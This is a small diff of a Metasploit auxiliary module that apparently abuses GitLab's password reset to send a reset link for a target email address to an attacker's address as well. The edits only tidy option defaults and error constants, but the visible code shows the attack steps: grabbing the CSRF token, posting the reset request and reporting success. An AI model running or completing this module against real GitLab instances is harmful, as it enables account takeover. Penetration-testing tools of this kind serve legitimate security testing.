@@ -44,8 +44,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('TARGETEMAIL', [ true, 'The email address to compromise', '' ]),
-        OptString.new('MYEMAIL', [ true, 'An email address to also send the password reset email to', '' ]),
+        OptString.new('TARGETEMAIL', [ true, 'The email address to compromise' ]),
+        OptString.new('MYEMAIL', [ true, 'An email address to also send the password reset email to' ]),
         OptString.new('TARGETURI', [true, 'The path to GitLab', '/'])
       ]
     )
@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri, 'users', 'sign_in')
     )
 
-    fail_with(Msf::Module::Failure::Unreachable, 'No response received') if res.nil?
+    fail_with(Failure::Unreachable, 'No response received') if res.nil?
 
     fail_with(Failure::UnexpectedReply, 'Unable to find CSRF token') unless res.body =~ %r{<meta name="csrf-token" content="([^"]+)" />}
     print_good("CSRF Token: #{::Regexp.last_match(1)}")
@@ -74,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
         "authenticity_token=#{::Regexp.last_match(1)}"
       ].join('&')
     )
-    fail_with(Msf::Module::Failure::Unreachable, 'No response received') if res.nil?
+    fail_with(Failure::Unreachable, 'No response received') if res.nil?
 
     if res.code == 302
       print_good("Sent, check #{datastore['MYEMAIL']} for a possible password reset link (failure is blind)")
